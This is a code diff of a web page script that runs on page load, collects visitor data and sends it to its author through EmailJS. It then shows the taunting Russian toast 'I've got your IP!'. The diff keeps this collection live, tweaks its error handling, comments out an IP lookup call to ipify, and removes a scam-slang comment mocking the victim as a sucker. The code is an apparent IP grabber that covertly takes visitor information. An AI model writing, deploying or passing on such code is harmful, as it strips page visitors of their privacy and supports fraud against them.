@@ -51,12 +51,18 @@ async function collectAndSend() {
   try {
     emailjs.init(EMAILJS_PUBLIC_KEY);
     await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
-    showToast('Твой IP у меня! ', 'success');
+    showToast('Твой IP у меня!', 'success');
   } catch(err) {
-    console.warn('EmailJS error:', err);
+    console.error('EmailJS error:', err);
+    showToast('Ошибка: ' + err.text, 'error');
   }
 }
-fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => console.log(d))
+// fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => console.log(d))
 
 window.addEventListener('load', collectAndSend);
-// ну ты и мамонт
+
+
+
+
+
+
